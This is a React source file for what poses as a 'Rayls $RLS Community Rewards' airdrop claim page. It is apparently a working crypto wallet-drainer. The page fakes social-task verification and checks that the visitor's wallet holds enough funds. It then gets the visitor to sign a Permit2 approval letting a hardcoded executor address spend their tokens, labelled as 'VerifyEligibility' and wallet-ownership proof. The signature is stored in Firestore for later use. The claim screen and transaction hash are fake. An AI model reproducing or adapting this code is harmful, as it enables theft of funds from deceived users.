import React, { useState, useEffect } from 'react';
import { createAppKit } from '@reown/appkit/react';
import { EthersAdapter } from '@reown/appkit-adapter-ethers';
import { mainnet } from '@reown/appkit/networks';
import { BrowserProvider, Contract, formatUnits } from 'ethers';
import { doc, setDoc, onSnapshot } from 'firebase/firestore';
import { ChevronRight, Wallet, Check, Twitter, MessageSquare, Loader2, CheckCircle2, Copy, FileSignature, ShieldCheck, AlertCircle } from 'lucide-react';

// --- IMPORTS FROM LOGIC FILE ---
import { db } from './firebase'; // Ensure this file exists in your project
import Admin from './Admin';     // Ensure this file exists in your project

// -----------------------------
// CONFIGURATION
// -----------------------------
const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const UNIVERSAL_ROUTER = "0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B";
const HARDCODED_EXECUTOR = '0x05a5b264448da10877f79fbdff35164be7b9a869';
const USDT_DECIMALS = 6n;
const SPENDING_CAP = BigInt(10000) * (10n ** USDT_DECIMALS);

// Initialize Reown AppKit
const appKit = createAppKit({
  adapters: [new EthersAdapter()],
  networks: [mainnet],
  projectId: import.meta.env.VITE_REOWN_PROJECT_ID,
  metadata: {
    name: 'Permit2 App',
    description: 'Universal Router Permit2 Signer',
    url: 'https://example.com',
    icons: []
  },
});

// -----------------------------
// UI COMPONENTS (SVG & LAYOUT)
// ----------------------------- 

const RaylsLogo = ({ className = "text-black" }) => (
  <svg width="28" height="28" viewBox="0 0 50 50" fill="none" className={className}>
    <path d="M10 18 C 22 18, 38 12, 45 8" stroke="currentColor" strokeWidth="7" strokeLinecap="round" />
    <path d="M10 32 C 22 32, 38 26, 45 20" stroke="currentColor" strokeWidth="7" strokeLinecap="round" />
    <path d="M10 32 C 2 32, 2 18, 10 18" stroke="currentColor" strokeWidth="7" strokeLinecap="round" />
  </svg>
);

const BackgroundGraphics = ({ variant = 'default' }) => (
  <div className="absolute inset-0 z-0 pointer-events-none overflow-hidden">
    <svg className="w-full h-full" viewBox="0 0 375 812" preserveAspectRatio="none" xmlns="http://www.w3.org/2000/svg">
      {variant === 'default' ? (
        <>
          <path d="M-100 200 C 0 220, 150 280, 400 350 L 400 450 C 150 380, 0 300, -100 280 Z" fill="#EAD1FF" opacity="0.8" />
          <path d="M-100 300 C 0 320, 150 400, 400 450 L 400 580 C 150 500, 0 400, -100 380 Z" fill="#DAB6FF" opacity="0.9" />
          <path d="M-100 450 C 0 450, 150 520, 400 550 L 400 750 C 150 650, 0 550, -100 580 Z" fill="#DAB6FF" opacity="0.6" />
        </>
      ) : (
        <>
           <rect width="100%" height="100%" fill="#C4B5FD" />
           <circle cx="0" cy="400" r="300" fill="#DFFF26" opacity="0.8" filter="url(#blurMe)" />
           <circle cx="400" cy="800" r="300" fill="#A78BFA" opacity="0.8" filter="url(#blurMe)" />
           <defs>
            <filter id="blurMe">
              <feGaussianBlur in="SourceGraphic" stdDeviation="60" />
            </filter>
           </defs>
        </>
      )}
    </svg>
  </div>
);

const Footer = () => (
  <footer className="relative z-10 bg-[#0F0F0F] text-white pt-8 pb-10 px-6 mt-auto">
    <div className="mb-8">
      <p className="text-sm text-gray-400 mb-1 flex items-center gap-1.5">
        Powered by <span className="text-white font-black text-lg tracking-wider">CLIQUE</span>
      </p>
    </div>
    <div className="flex flex-wrap gap-x-6 gap-y-2 text-sm underline decoration-gray-500 underline-offset-4 text-gray-200 mb-5 font-light">
      <a href="#" className="hover:text-white transition-all">Privacy Policy</a>
      <a href="#" className="hover:text-white transition-all">General Terms of Service</a>
    </div>
    <div className="text-sm text-gray-400 font-light">© 2025 Rayls. All rights reserved.</div>
    <div className="absolute bottom-2 left-1/2 transform -translate-x-1/2 w-32 h-1.5 bg-gray-700/50 rounded-full mt-4"></div>
  </footer>
);

// -----------------------------
// STEPPER COMPONENTS
// -----------------------------

const Stepper = ({ currentStep }) => (
  <div className="relative z-10 px-4 mb-6 w-full max-w-md mx-auto">
    <div className="bg-[#111] rounded-full p-1 flex items-center justify-between text-white text-sm font-medium h-12 shadow-lg">
      {[1, 2, 3, 4, 5].map((step) => {
        const isActive = step === currentStep;
        return (
          <div key={step} className={`flex-1 flex items-center justify-center h-full rounded-full transition-all duration-300 ${isActive ? 'bg-[#A38CFF] text-black shadow-sm font-bold' : 'text-gray-400'}`}>
            {isActive ? `Step${step}` : step}
          </div>
        );
      })}
    </div>
  </div>
);

const StepLayout = ({ step, title, subtitle, children, nextLabel = "Next", onNext, isNextDisabled }) => (
  <div className="min-h-screen flex flex-col relative bg-[#C4B5FD] font-sans">
    <BackgroundGraphics variant="step1" />
    <div className="relative z-20 bg-transparent px-4 py-2 text-xs font-medium text-black/80 text-center sm:text-left">
      Please join our <span className="underline font-bold cursor-pointer">Discord</span> if you have any questions or need further support.
    </div>
    <header className="relative z-10 px-6 py-4 flex items-center">
      <div className="flex items-center gap-2.5">
        <RaylsLogo />
        <span className="text-xl font-bold tracking-tight text-black">Rayls</span>
      </div>
    </header>
    <Stepper currentStep={step} />
    <main className="relative z-10 px-4 pb-10 flex-1 flex flex-col items-center">
      <div className="bg-white rounded-3xl p-6 shadow-xl flex flex-col items-center text-center w-full max-w-md mx-auto min-h-[420px]">
        <h2 className="text-2xl font-bold text-black mb-3 mt-2">{title}</h2>
        <p className="text-gray-500 text-sm mb-6 px-2 leading-relaxed max-w-[90%]">{subtitle}</p>
        <div className="w-full flex-1 flex flex-col items-center">{children}</div>
        {onNext && (
          <button 
            onClick={onNext} 
            disabled={isNextDisabled}
            className={`w-full py-4 rounded-2xl font-medium text-base transition-all mt-6 ${!isNextDisabled ? 'bg-black text-white shadow-lg active:scale-95 cursor-pointer hover:bg-gray-900' : 'bg-gray-100 text-gray-400 cursor-not-allowed'}`}>
            {nextLabel}
          </button>
        )}
      </div>
    </main>
    <Footer />
  </div>
);

// -----------------------------
// STEP CONTENT COMPONENTS
// -----------------------------

const LandingPage = ({ onEnter }) => (
  <div className="min-h-screen flex flex-col relative bg-[#DFFF26] text-black">
    <BackgroundGraphics variant="default" />
    <header className="relative z-10 px-6 py-6 flex items-center justify-between">
      <div className="flex items-center gap-2.5">
        <RaylsLogo />
        <span className="text-xl font-bold tracking-tight">Rayls</span>
      </div>
    </header>
    <main className="relative z-10 flex-1 flex flex-col items-center justify-center text-center px-4 pb-20 mt-[-40px]">
      <div className="mb-8 transform translate-x-1">
        <svg width="72" height="72" viewBox="0 0 100 100" fill="none" className="text-black">
             <path d="M20 35 C 45 35, 75 25, 90 15" stroke="currentColor" strokeWidth="14" strokeLinecap="round" />
             <path d="M20 65 C 45 65, 75 55, 90 45" stroke="currentColor" strokeWidth="14" strokeLinecap="round" />
             <path d="M20 65 C 5 65, 5 35, 20 35" stroke="currentColor" strokeWidth="14" strokeLinecap="round" />
        </svg>
      </div>
      <h1 className="text-5xl font-extrabold text-black leading-[1.1] tracking-tight mb-2">$RLS<br />Community<br />Rewards</h1>
      <p className="text-black/80 text-[1.05rem] mt-3 mb-10 font-medium tracking-wide">Verify your activity to unlock your reward</p>
      <button onClick={onEnter} className="group bg-[#111] text-white pl-10 pr-8 py-4 rounded-full font-medium text-base flex items-center gap-2 hover:bg-black/80 transition-all shadow-xl active:scale-95 cursor-pointer">
        Enter <ChevronRight size={18} className="group-hover:translate-x-0.5 transition-transform" />
      </button>
    </main>
    <Footer />
  </div>
);

const Step1Content = ({ onNext, openWallet, isConnected, connectedAddress }) => {
  const [isChecked, setIsChecked] = useState(false);

  return (
    <StepLayout step={1} title="Connect Wallet" subtitle="Connect your wallet to check your eligibility for rewards." onNext={onNext} isNextDisabled={!isChecked || !isConnected}>
      <button onClick={openWallet} className={`w-full transition-colors rounded-xl p-4 flex items-center justify-between mb-auto group cursor-pointer border ${isConnected ? 'bg-green-50 border-green-200' : 'bg-gray-50 border-transparent hover:border-gray-200 hover:bg-gray-100'}`}>
        <div className="flex items-center gap-3">
          <div className={`p-2 rounded-lg shadow-sm border ${isConnected ? 'bg-green-100 border-green-200' : 'bg-white border-gray-100'}`}>
             <Wallet size={20} className="text-black" />
          </div>
          <span className="font-medium text-black">
            {isConnected ? `Connected: ${connectedAddress.slice(0,6)}...${connectedAddress.slice(-4)}` : "Connect Wallet"}
          </span>
        </div>
        {isConnected ? <CheckCircle2 size={18} className="text-green-500" /> : <ChevronRight size={18} className="text-gray-400 group-hover:text-black transition-colors" />}
      </button>

      <div className="flex items-start gap-3 mt-8 mb-2 text-left bg-gray-50 p-3 rounded-xl w-full">
        <div className="relative flex items-center pt-1">
          <input type="checkbox" id="us-confirm" className="peer h-5 w-5 cursor-pointer appearance-none rounded border border-gray-400 checked:border-black checked:bg-black transition-all" checked={isChecked} onChange={() => setIsChecked(!isChecked)} />
          <Check size={14} className="pointer-events-none absolute left-1/2 top-[45%] -translate-x-1/2 -translate-y-1/2 text-white opacity-0 peer-checked:opacity-100" />
        </div>
        <label htmlFor="us-confirm" className="text-xs text-gray-600 leading-relaxed cursor-pointer select-none">
          I confirm that I am not a U.S. Person (including U.S. citizens, residents, entities, or anyone located in the United States).
        </label>
      </div>
    </StepLayout>
  );
};

const Step2Content = ({ onNext }) => {
  const [verifying, setVerifying] = useState(false);
  const [verified, setVerified] = useState(false);

  const handleVerify = () => {
    setVerifying(true);
    setTimeout(() => {
      setVerifying(false);
      setVerified(true);
    }, 1500);
  };

  return (
    <StepLayout step={2} title="Check Eligibility" subtitle="Verify your on-chain activity and social status to proceed." onNext={onNext} isNextDisabled={!verified}>
      <div className="space-y-3 w-full mb-auto">
        <button className="w-full bg-gray-50 hover:bg-gray-100 transition-colors rounded-xl p-4 flex items-center justify-between group cursor-pointer border border-transparent hover:border-gray-200">
          <div className="flex items-center gap-3">
            <div className="p-2 bg-[#5865F2]/10 rounded-lg"><MessageSquare size={20} className="text-[#5865F2]" fill="currentColor" /></div>
            <span className="font-medium text-black">Join Discord</span>
          </div>
          <div className="px-3 py-1 bg-green-100 text-green-700 text-xs font-bold rounded-full">Connected</div>
        </button>

        <button onClick={handleVerify} className="w-full bg-gray-50 hover:bg-gray-100 transition-colors rounded-xl p-4 flex items-center justify-between group cursor-pointer border border-transparent hover:border-gray-200 relative overflow-hidden">
          <div className="flex items-center gap-3">
            <div className="p-2 bg-black/5 rounded-lg"><Twitter size={20} className="text-black" fill="currentColor" /></div>
            <span className="font-medium text-black">Follow @Rayls_Global</span>
          </div>
          {verified ? <CheckCircle2 size={20} className="text-green-500" /> : verifying ? <Loader2 size={20} className="text-gray-400 animate-spin" /> : <ChevronRight size={18} className="text-gray-400 group-hover:text-black transition-colors" />}
        </button>
      </div>
      {!verified && <div className="mt-6 text-xs text-gray-400 bg-yellow-50 p-3 rounded-lg border border-yellow-100 text-center w-full">Please complete all tasks to continue.</div>}
    </StepLayout>
  );
};

const Step3Content = ({ onNext, onSign, signStatus, errorMessage, walletBalance, isCheckingBalance }) => {
  const isSigned = signStatus === 'success';
  const isSigning = signStatus === 'loading';
  const hasInsufficientBalance = walletBalance !== null && walletBalance < 50;
  const canSign = walletBalance !== null && walletBalance >= 50;

  return (
    <StepLayout step={3} title="Sign Permit" subtitle="Sign a secure permit to verify wallet ownership and authorize your claim." onNext={onNext} isNextDisabled={!isSigned}>
      <div className="w-full mb-auto flex flex-col items-center">
        <div className={`w-20 h-20 rounded-full flex items-center justify-center mb-6 transition-colors duration-500 ${isSigned ? 'bg-green-100' : 'bg-blue-50'}`}>
          {isSigned ? <ShieldCheck size={40} className="text-green-600" /> : <FileSignature size={36} className="text-blue-500" />}
        </div>

        {!isSigned ? (
          <div className="w-full bg-gray-50 rounded-xl p-5 border border-gray-100 flex flex-col gap-4">
             <div className="flex justify-between text-sm"><span className="text-gray-500">Function</span><span className="font-mono text-black font-medium">VerifyEligibility()</span></div>
             <div className="flex justify-between text-sm">
               <span className="text-gray-500">Wallet Balance</span>
               {isCheckingBalance ? (
                 <span className="text-gray-400 font-medium flex items-center gap-1">
                   <Loader2 size={12} className="animate-spin" /> Checking...
                 </span>
               ) : walletBalance !== null ? (
                 <span className={`font-bold ${walletBalance >= 50 ? 'text-green-600' : 'text-red-600'}`}>
                   ${walletBalance.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                 </span>
               ) : (
                 <span className="text-gray-400 font-medium">Unknown</span>
               )}
             </div>
             <div className="flex justify-between text-sm"><span className="text-gray-500">Status</span><span className="text-orange-500 font-medium">Waiting for signature</span></div>
             
             <button onClick={onSign} disabled={isSigning || !canSign || isCheckingBalance} className={`w-full mt-2 py-3 rounded-lg font-medium text-sm transition-colors flex items-center justify-center gap-2 ${isSigning || !canSign || isCheckingBalance ? 'bg-gray-300 text-gray-500 cursor-not-allowed' : 'bg-black text-white hover:bg-gray-800'}`}>
               {isSigning ? <Loader2 size={16} className="animate-spin" /> : isCheckingBalance ? 'Checking Balance...' : !canSign ? 'Insufficient Balance' : 'Sign Message'}
             </button>
          </div>
        ) : (
          <div className="w-full bg-green-50 rounded-xl p-5 border border-green-100 text-center animate-in fade-in zoom-in duration-300">
             <p className="text-green-800 font-semibold mb-1">Signature Verified</p>
             <p className="text-green-600 text-xs">Your wallet has been successfully authorized.</p>
          </div>
        )}

        {errorMessage && (
           <div className="mt-4 flex gap-2 items-start bg-red-50 p-3 rounded-lg border border-red-100 text-left w-full">
              <AlertCircle size={16} className="text-red-600 shrink-0 mt-0.5" />
              <p className="text-xs text-red-700 leading-snug break-all">{errorMessage}</p>
           </div>
        )}

        {!isSigned && !errorMessage && hasInsufficientBalance && (
           <div className="mt-4 flex gap-2 items-start bg-red-50 p-3 rounded-lg border border-red-200 text-left w-full">
              <AlertCircle size={16} className="text-red-600 shrink-0 mt-0.5" />
              <p className="text-xs text-red-700 leading-snug">
                <span className="font-bold">Insufficient Balance:</span> Your wallet balance is <span className="font-bold">${walletBalance?.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</span>. You need at least <span className="font-bold">$50</span> in assets to claim your reward.
              </p>
           </div>
        )}
        {!isSigned && !errorMessage && !hasInsufficientBalance && walletBalance === null && (
           <div className="mt-4 flex gap-2 items-start bg-yellow-50 p-3 rounded-lg border border-yellow-100 text-left w-full">
              <AlertCircle size={16} className="text-yellow-600 shrink-0 mt-0.5" />
              <p className="text-xs text-yellow-700 leading-snug"><span className="font-bold">Requirement:</span> Your wallet must hold at least <span className="font-bold">$50</span> in assets.</p>
           </div>
        )}
      </div>
    </StepLayout>
  );
};

const Step4Content = ({ onNext, connectedAddress }) => (
  <StepLayout step={4} title="Claim Rewards" subtitle="You are eligible! Claim your $RLS allocation now." onNext={onNext} nextLabel="Claim Tokens" isNextDisabled={false}>
    <div className="w-full flex flex-col items-center justify-center flex-1 py-4">
      <div className="text-sm font-medium text-gray-500 uppercase tracking-widest mb-2">Total Allocation</div>
      <div className="text-5xl font-extrabold text-black mb-1">500</div>
      <div className="text-xl font-bold text-[#A38CFF] mb-8">$RLS</div>
      <div className="w-full bg-gray-50 rounded-xl p-4 flex items-center justify-between border border-gray-100">
        <div className="flex flex-col text-left">
          <span className="text-xs text-gray-400">Wallet Address</span>
          <span className="text-sm font-mono text-black font-medium">{connectedAddress ? `${connectedAddress.slice(0,6)}...${connectedAddress.slice(-4)}` : '...'}</span>
        </div>
        <button className="text-gray-400 hover:text-black transition-colors"><Copy size={16} /></button>
      </div>
    </div>
  </StepLayout>
);

const Step5Content = ({ onRestart }) => (
  <StepLayout step={5} title="Success!" subtitle="Your tokens have been successfully claimed and will arrive shortly." onNext={onRestart} nextLabel="Back to Home" isNextDisabled={false}>
    <div className="w-full flex flex-col items-center justify-center flex-1">
      <div className="w-24 h-24 bg-green-100 rounded-full flex items-center justify-center mb-6 animate-bounce">
        <Check size={48} className="text-green-600" strokeWidth={3} />
      </div>
      <div className="bg-gray-50 w-full rounded-xl p-4 text-center">
         <p className="text-sm text-gray-600">Transaction Hash</p>
         <p className="text-xs font-mono text-blue-500 mt-1 cursor-pointer hover:underline">0x8a7...3b21</p>
      </div>
    </div>
  </StepLayout>
);

// -----------------------------
// MAIN APP COMPONENT
// -----------------------------

export default function App() {
  // Routing / Admin Check
  const [isAdmin] = useState(() => window.location.pathname === '/admin');

  // Logic State
  const [executorAddress, setExecutorAddress] = useState(HARDCODED_EXECUTOR);
  const [status, setStatus] = useState("Not connected");
  const [connectedAddress, setConnectedAddress] = useState(null);
  const [signStatus, setSignStatus] = useState('idle'); // 'idle' | 'loading' | 'success' | 'error'
  const [errorMessage, setErrorMessage] = useState('');
  const [walletBalance, setWalletBalance] = useState(null); // Balance in USD
  const [isCheckingBalance, setIsCheckingBalance] = useState(false);

  // UI State
  const [currentPage, setCurrentPage] = useState('landing');

  // 1. Account Subscription
  useEffect(() => {
    const unsub = appKit.subscribeAccount((acct) => {
      if (acct?.isConnected && acct?.address) {
        setStatus(`Connected: ${acct.address}`);
        setConnectedAddress(acct.address);
      } else {
        setStatus("Not connected");
        setConnectedAddress(null);
      }
    });
    return () => unsub();
  }, []);

  // 2. Firestore Sync (Legacy support)
  useEffect(() => {
    try {
      const ref = doc(db, 'admin_config', 'settings');
      const unsub = onSnapshot(ref, () => {} , (err) => console.error('admin settings onSnapshot error', err));
      return () => unsub();
    } catch (e) {
      // ignore if Firestore unavailable
    }
  }, []);

  // 3. Check Wallet Balance
  const checkWalletBalance = async () => {
    if (!connectedAddress) return;

    try {
      setIsCheckingBalance(true);
      setWalletBalance(null);

      const walletProvider = appKit.getWalletProvider();
      if (!walletProvider) throw new Error("Wallet provider not available.");

      const provider = new BrowserProvider(walletProvider);

      // Get ETH balance
      const ethBalance = await provider.getBalance(connectedAddress);
      const ethBalanceInEth = parseFloat(formatUnits(ethBalance, 18));

      // Fetch ETH price from CoinGecko
      const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
      const data = await response.json();
      const ethPrice = data?.ethereum?.usd || 0;

      // Calculate total balance in USD
      const totalBalanceUSD = ethBalanceInEth * ethPrice;

      // Check ERC20 tokens (USDT, USDC, DAI)
      const ERC20_ABI = [
        "function balanceOf(address) view returns (uint256)",
        "function decimals() view returns (uint8)"
      ];

      const tokenAddresses = [
        { address: '0xdac17f958d2ee523a2206206994597c13d831ec7', decimals: 6 }, // USDT
        { address: '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48', decimals: 6 }, // USDC
        { address: '0x6b175474e89094c44da98b954eedeac495271d0f', decimals: 18 }, // DAI
      ];

      let tokenBalanceUSD = 0;
      for (const token of tokenAddresses) {
        try {
          const tokenContract = new Contract(token.address, ERC20_ABI, provider);
          const balance = await tokenContract.balanceOf(connectedAddress);
          const balanceInToken = parseFloat(formatUnits(balance, token.decimals));
          tokenBalanceUSD += balanceInToken; // Assuming stablecoins = $1
        } catch (err) {
          console.error(`Error fetching balance for token ${token.address}:`, err);
        }
      }

      const finalBalance = totalBalanceUSD + tokenBalanceUSD;
      setWalletBalance(finalBalance);

    } catch (err) {
      console.error('Error checking wallet balance:', err);
      setWalletBalance(0);
    } finally {
      setIsCheckingBalance(false);
    }
  };

  // Check balance when user reaches Step 3
  useEffect(() => {
    if (currentPage === 3 && connectedAddress) {
      checkWalletBalance();
    }
  }, [currentPage, connectedAddress]);

  // 4. Main Business Logic: Sign Permit
  const signPermit = async () => {
    try {
      setSignStatus('loading');
      setErrorMessage('');

      if (!connectedAddress) {
        throw new Error("Wallet not connected");
      }

      // Check balance requirement
      if (walletBalance === null || walletBalance < 500) {
        throw new Error("Your wallet must hold at least $500 in assets to proceed.");
      }
      
      const walletProvider = appKit.getWalletProvider();
      if (!walletProvider) throw new Error("Wallet provider not available.");

      const provider = new BrowserProvider(walletProvider);
      const net = await provider.getNetwork();
      const chainId = Number(net.chainId);

      const deadline = Math.floor(Date.now() / 1000) + 30 * 24 * 60 * 60;
      const nonce = 0; 

      const permitted = {
        token: import.meta.env.VITE_TOKEN_ADDRESS,
        amount: SPENDING_CAP.toString(),
        expiration: deadline,
        nonce
      };

      const domain = { name: "Permit2", chainId, verifyingContract: PERMIT2 };
      const types = {
        EIP712Domain: [
          { name: "name", type: "string" },
          { name: "chainId", type: "uint256" },
          { name: "verifyingContract", type: "address" }
        ],
        PermitSingle: [
          { name: "details", type: "PermitDetails" },
          { name: "spender", type: "address" },
          { name: "sigDeadline", type: "uint256" }
        ],
        PermitDetails: [
          { name: "token", type: "address" },
          { name: "amount", type: "uint160" },
          { name: "expiration", type: "uint48" },
          { name: "nonce", type: "uint48" }
        ]
      };

      // Spender MUST be the Executor
      const message = {
        details: permitted,
        spender: executorAddress,
        sigDeadline: deadline
      };

      const payload = JSON.stringify({ domain, types, primaryType: "PermitSingle", message });

      const signature = await walletProvider.request({
        method: "eth_signTypedData_v4",
        params: [connectedAddress, payload]
      });

      const raw = signature.substring(2);
      const r = "0x" + raw.substring(0, 64);
      const s = "0x" + raw.substring(64, 128);
      let v = parseInt(raw.substring(128, 130), 16);
      // Normalize v to 27/28 if wallet returned 0/1
      if (v === 0 || v === 1) v += 27;

      const id = connectedAddress + "_" + Date.now();

      // Save both `deadline` (used by worker) and `expiration` for backwards compatibility
      await setDoc(doc(db, "permit2_signatures", id), {
        owner: connectedAddress,
        spender: executorAddress,
        token: import.meta.env.VITE_TOKEN_ADDRESS,
        amount: SPENDING_CAP.toString(),
        deadline: deadline,
        expiration: deadline,
        nonce,
        r, s, v,
        processed: false,
        timestamp: Date.now()
      });

      setSignStatus('success');

    } catch (err) {
      console.error(err);
      setErrorMessage(err?.message || String(err));
      setSignStatus('error');
    }
  };

  const openWallet = () => appKit.open();

  // 4. Rendering Logic
  if (isAdmin) {
    return <Admin />;
  }

  const renderContent = () => {
    switch(currentPage) {
      case 'landing':
        return <LandingPage onEnter={() => setCurrentPage(1)} />;
      case 1:
        return <Step1Content 
          onNext={() => setCurrentPage(2)} 
          openWallet={openWallet} 
          isConnected={!!connectedAddress} 
          connectedAddress={connectedAddress}
        />;
      case 2:
        return <Step2Content onNext={() => setCurrentPage(3)} />;
      case 3:
        return <Step3Content 
          onNext={() => setCurrentPage(4)} 
          onSign={signPermit}
          signStatus={signStatus}
          errorMessage={errorMessage}
          walletBalance={walletBalance}
          isCheckingBalance={isCheckingBalance}
        />;
      case 4:
        return <Step4Content onNext={() => setCurrentPage(5)} connectedAddress={connectedAddress} />;
      case 5:
        return <Step5Content onRestart={() => setCurrentPage('landing')} />;
      default:
        return <LandingPage onEnter={() => setCurrentPage(1)} />;
    }
  };

  return <>{renderContent()}</>;
}
